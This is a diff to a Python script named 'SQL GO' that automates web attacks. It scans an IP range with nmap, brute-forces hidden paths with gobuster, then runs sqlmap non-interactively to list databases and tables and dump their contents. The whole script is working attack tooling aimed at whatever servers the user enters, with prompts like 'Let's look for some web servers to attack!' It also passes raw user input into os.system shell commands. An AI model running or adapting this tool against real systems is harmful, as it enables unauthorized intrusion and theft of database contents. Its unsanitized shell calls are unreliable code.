@@ -3,6 +3,7 @@
 import os
 import nmap
 
+
 if os.geteuid() != 0:
     print("\nYou must run this script as a root user.\n")
 
@@ -14,34 +15,34 @@ if os.geteuid() != 0:
 
 
 def nmap_scan():
-    ip_addr = input("\nLet's look for some web servers to attack! \nType in the IP range you would like to scan: ")    
-	
+    ip_addr = input("\nLet's look for some web servers to attack! \nType in the IP range you would like to scan: ")
+
     nm = nmap.PortScanner()
     nm.scan(hosts = ip_addr, arguments = '--open -n -sV -p80,443')
     num = 0
-    
+
     #exit if nothing scanned
     if  len(nm.all_hosts()) == 0:
         print()
-        response = input("No hosts found. Please use another IP range or press 'q' to quit: ")
-        if response == "c":
+        response = input("No hosts found. Please use another IP range.\nPress 'q' to quit or anything to start over: ")
+        if response == "q":
             exit(0)
         else:
-            nm = nmap.PortScanner()
-            nm.scan(hosts = response, arguments = '--open -n -sV -p80,443')
-            num = 0  
+            return "error"
 
     for host in nm.all_hosts():
         num+= 1
         print ('---------------------------')
         print ([num] ,host, '- state:', nm[host].state())
     print()
-    
-    print('Now, lets look for hidden paths in the webserver that could be exploitable')    
+
+    print('Now, lets look for hidden paths in the webserver that could be exploitable')
     webserver = input('Type the number of the IP that you would like to attack: ')
-    
+
     print(webserver)
     return webserver
+
+
 
 """
 def nmap_scan():
@@ -55,7 +56,7 @@ def nmap_scan():
 
     except KeyboardInterrupt:
         print ("nmap scan failed. Run script again.")
-    
+
     #ask user to input a website from the nmap command output. Maybe do a check to ensure that whatever they put was output from the nmap command?
     webserver = input("\nNow, let's look for hidden paths in the webserver that could be exploitable!\nType in the webserver you would like to attack: ")
     return webserver
@@ -71,23 +72,48 @@ def parseNmapOutput():
         if "Nmap scan report for " in line:
             arr = line.split()
             print(arr[-1])
- 
+
         if "Host is up " not in line and len(line) != 1 and "Not shown" not in line and "Nmap" not in line and "Service" not in line:
             print(line)
     if count == 2 or count == 3:
         result = "No hosts found."
         return result
 """
-    
+
 
 
 def gobuster(webserver):
     #OS MKDIR TO INCLUDE OUR FOLDER FOR THIS APPLICATION
-    cmd = "gobuster -o gobust.txt -u " + webserver + " -w /usr/share/wordlists/dirb/common.txt"
+    cmd = "gobuster -o /usr/share/sqlgo/gobust.txt -u " + webserver + " -w /usr/share/wordlists/dirb/common.txt > /usr/share/sqlgo/gobusteroutput.txt"
     try:
         os.system(cmd)
+        resultstr = parseBuster()
+        if resultstr == "error":
+            response = input("Press 'q' to quit or type another webserver: ")
+            if response == 'q':
+                exit(0)
+            else:
+                return "error", response
+        else:
+            print()
+            print("Hidden paths in the given webserver:")
+            os.system(resultstr)
+            print()
+            return resultstr, "ok"
     except KeyboardInterrupt:
         print ("Gobuster failed. Run script again")
+
+def parseBuster():
+    s = open("/usr/share/sqlgo/gobust.txt", "r")
+    string = s.read()
+    result = []
+    if len(string) == 0:
+        print("Unable to connect to given webserver.")
+        return "error"
+    else:
+        cmd = "cat /usr/share/sqlgo/gobust.txt"
+        return cmd
+
 
 def getHiddenPath():
     hidden_path = input("What hidden path would you like to SQL inject? ")
@@ -115,7 +141,7 @@ def sqlmap(webserver, hidden_path, option_chosen):
     """
     result = ""
 
-    if option_chosen == 1: 
+    if option_chosen == 1:
         base_cmd = "sqlmap -u " + "\"http://" + webserver + hidden_path + "/" + "?id=1&Submit=Submit#\""
 
     if option_chosen == 2 or option_chosen == 3:
@@ -124,28 +150,27 @@ def sqlmap(webserver, hidden_path, option_chosen):
         paramstring = parseCurl()
         base_cmd = "sqlmap -u " + "\"http://" + webserver + hidden_path + "\" " + "--data=" + paramstring
 
-    cmd = base_cmd + " --dbs" + " > /usr/share/sqlgo/sqlmapoutput.txt"
+    cmd = base_cmd + " --dbs  --batch " + " > /usr/share/sqlgo/sqlmapoutput.txt"
 
-    #print(cmd)    
+    #print(cmd)
     try:
         os.system(cmd)
         resultstr = parseSqlMap()
         if resultstr == "error":
-            response = input("Press 'q' to quit or anything to choose another SQLMap option: ")
+            response = input("Press 'q' to quit or anything to display the SQLMap options again: ")
             if response == 'q':
                 exit(0)
             else:
-                return "error"
+                return "error", ["error"]
     except KeyboardInterrupt:
         print ("SQLMap failed. Run script again")
-    return base_cmd
+    return base_cmd, resultstr
 
 
 
 def parseSqlMap():
     s = open("/usr/share/sqlgo/sqlmapoutput.txt", "r")
     print()
-    print("Available Databases:")
     result = []
     resultstr = ""
     line_iter = iter(s)
@@ -153,15 +178,17 @@ def parseSqlMap():
         line = line.rstrip()
         if "[*]" in line:
             result.append(line)
-    
+
     if(len(result) == 2):
         resultstr = "error"
         print("This path does not seem to be injectible by the option chosen.")
-        return resultstr  
-    
+        return resultstr
+
+    print("Available Databases:")
     for i in range(1, len(result)-1):
         print(result[i])
     print()
+    return result
 
 
 def parseCurl():
@@ -184,6 +211,7 @@ def parseCurl():
     resultstr += "\""
     return resultstr
 
+"""
 def parseCookie():
     s = open("/usr/share/sqlgo/cookies.txt", "r")
     line_iter = iter(s)
@@ -192,29 +220,104 @@ def parseCookie():
             arr = line.split()
             cookie = arr[-1]
             return cookie
-            
+"""
 
-def database_search(base_cmd):
+def database_search(base_cmd, database_list):
     database = input("Let's look inside the databases. We will start by displaying its tables. \nChoose a database to assess: ")
-    cmd = base_cmd + " -D " + database +  " --tables"
+    cmd = base_cmd + " -D " + database +  " --tables --batch > /usr/share/sqlgo/sqlmapdb.txt"
     try:
         os.system(cmd)
+        status, tables = checkdb()
+        if status == "error":
+            response = input("Press 'q' to quit or anything to display the databases again: ")
+            if response == 'q':
+                exit(0)
+            else:
+                return status, tables
+        else:
+            return database, tables
     except KeyboardInterrupt:
         print ("SQLMap - search for database failed. Run script again")
-    return database
+
+
+def checkdb():
+    s = open("/usr/share/sqlgo/sqlmapdb.txt", "r")
+    result = []
+    resultstr = ""
+    count=0
+    always_print = False
+    lines = s.readlines()
+    for line in lines:
+        line = line.rstrip()
+        if always_print or "Database" in line:
+            result.append(line)
+            always_print=True
+        if "+-" in line:
+            count+=1
+        if count == 2:
+            always_print=False
+
+    if len(result) == 0:
+        print("Unable to retrieve tables from chosen database.")
+        return "error", result
+
+    print()
+    print("Available Tables:")
+    for table in result:
+        print(table)
+    print()
+    return "ok", result
+
 
 def table_dump(base_cmd, database):
     table = input("Let's look inside the tables. Choose a table to display its contents: ")
-    cmd = base_cmd + " --dump -D " + database +  " -T " + table
+    cmd = base_cmd + " --dump -D " + database +  " -T " + table + " --batch > /usr/share/sqlgo/sqlmapdata.txt"
     try:
         os.system(cmd)
+        status = parseData()
+        if status == "error":
+            response = input("Press 'q' to quit or anything to display the tables again: ")
+            if response == 'q':
+                exit(0)
+            else:
+                return status
     except KeyboardInterrupt:
         print ("SQLMap - search for database table failed. Run script again")
+
+def parseData():
+    s = open("/usr/share/sqlgo/sqlmapdata.txt", "r")
+    result = []
+    resultstr = ""
+    count=0
+    always_print = False
+    lines = s.readlines()
+
+    for line in lines:
+        line = line.rstrip()
+        if always_print or "Database" in line:
+            result.append(line)
+            always_print=True
+        if "+-" in line:
+            count+=1
+        if count == 3:
+            always_print=False
+
+    if len(result) == 0:
+        print("Unable to retrieve entries from chosen table.")
+        return "error"
+
+    print()
+    print("Entries Found:")
+    for data in result:
+        print(data)
+    print()
+
+    return result
 
 def intro():
     ascii_title =  "____   __   __       ___   __  \n/ ___) /  \ (  )     / __) /  \ \n\___ \(  O )/ (_/\  ( (_ \(  O )\n(____/ \__\)\____/   \___/ \__/      \n\n"
     print(ascii_title)
-    response = input("Type 'info' for information, anything else to continue to application: ") 
+    response = input("Type 'info' for information, anything else to continue to application: ")
     return response
 
 def info():
@@ -235,15 +338,40 @@ def execute_sqlgo():
     os.mkdir('/usr/share/sqlgo')
 
     webserver = nmap_scan() # should we clean up nmap output? put output in a seperate file? Give a warning to user when zero hosts are found?
-    gobuster(webserver)
+    while webserver == "error":
+        webserver = nmap_scan()
+
+    pathlist, response = gobuster(webserver)
+    while pathlist == "error":
+        pathlist, response = gobuster(response)
+        webserver = response
     hidden_path = getHiddenPath()
+
     option_chosen = inject_options_output()
-    base_cmd = sqlmap(webserver, hidden_path, option_chosen)
+    base_cmd, database_list = sqlmap(webserver, hidden_path, option_chosen)
     while base_cmd == "error":
-        option_chosen = inject_options_output()
-        base_cmd = sqlmap(webserver, hidden_path, option_chosen)
-    database = database_search(base_cmd)
-    table_dump(base_cmd, database)
+        option_chosen=inject_options_output()
+        base_cmd, database_list = sqlmap(webserver, hidden_path, option_chosen)
+
+
+    status, tables = database_search(base_cmd, database_list)
+    while status == "error":
+        print()
+        print("Available Databases:")
+        for i in range(1, len(database_list)-1):
+            print(database_list[i])
+        print()
+        status, tables = database_search(base_cmd, database_list)
+
+
+    datastatus = table_dump(base_cmd, status)
+    while datastatus == "error":
+        print()
+        print("Available Tables:")
+        for table in tables:
+            print(table)
+        print()
+        datastatus = table_dump(base_cmd, status)
 
 if __name__ == "__main__":
     response = intro()
@@ -251,3 +379,4 @@ if __name__ == "__main__":
         info()
     else:
         execute_sqlgo()
+
